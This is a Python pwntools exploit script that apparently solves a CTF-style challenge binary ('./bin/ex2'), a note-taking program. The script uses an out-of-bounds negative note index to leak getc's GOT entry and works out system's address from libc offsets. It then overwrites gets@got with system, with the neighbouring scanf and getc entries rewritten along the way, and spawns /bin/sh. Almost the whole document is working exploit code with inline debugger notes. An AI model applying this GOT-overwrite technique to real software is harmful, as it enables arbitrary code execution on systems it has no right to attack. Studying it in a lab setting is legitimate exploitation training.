#!/usr/bin/env python3

from pwn import *
target = process("./bin/ex2")

'''
pwndbg> info address getc
Symbol "getc" is at 0x7f11aea7eaa0 in a file compiled without debugging.
pwndbg> info address system
Symbol "system" is at 0x7f11aea4b980 in a file compiled without debugging.
pwndbg> p 0x7f11aea7eaa0 - 0x7f11aea4b980
$2 = 209184 => system_address = getc_address - 209184
'''

# Create a note to resolve gets@got
target.recvuntil(b'3. Exit\n')
target.sendline(b"1")
target.sendline(b"4")
target.sendline(b"AAAAA")

getc_index = (0x404040 - 0x404080) // 16 # Because NOTES[index] is 16 bytes long

print(f"Getc got index: {getc_index}")
target.sendline(b"2")
target.sendline(str(getc_index).encode())
print(target.recvuntil(b']: '))
getc_got_output = target.recvline().strip(b'\n')
print(getc_got_output)
getc_address = u64(getc_got_output.ljust(8, b'\x00'))

print(f"Parsed getc address: {hex(getc_address)}")


# Put /bin/sh string in NOTES[0]
target.sendline(b"1")
target.sendline(b"0")
target.sendline(b"/bin/sh\x00")

# Create a note to overwrite gets@got with system address
system_address = getc_address - 209184
gets_index = (0x404030 - 0x404080) // 16
target.sendline(b"1")
target.sendline(b"-5")
payload = p64(system_address)

# Unfortunately we also overwrite __isoc99_scanf@got which is next to gets@got
# pwndbg> info address __isoc99_scanf
# Symbol "__isoc99_scanf" is at 0x7f4320e54550 in a file compiled without debugging.
# pwndbg> info address getc
# Symbol "getc" is at 0x7f4320e7eaa0 in a file compiled without debugging.
# pwndbg> p 0x7f4320e7eaa0 - 0x7f4320e54550
# $3 = 173392 => scanf_address = getc_address - 173392
scanf_address = getc_address - 173392
payload += p64(scanf_address)

# APPARENTLY WE ALSO OVERWRITE GETC??????
payload += p64(getc_address)
target.sendline(payload)

# Trigger shell

target.sendline(b"1")
target.sendline(b"0")

target.interactive()
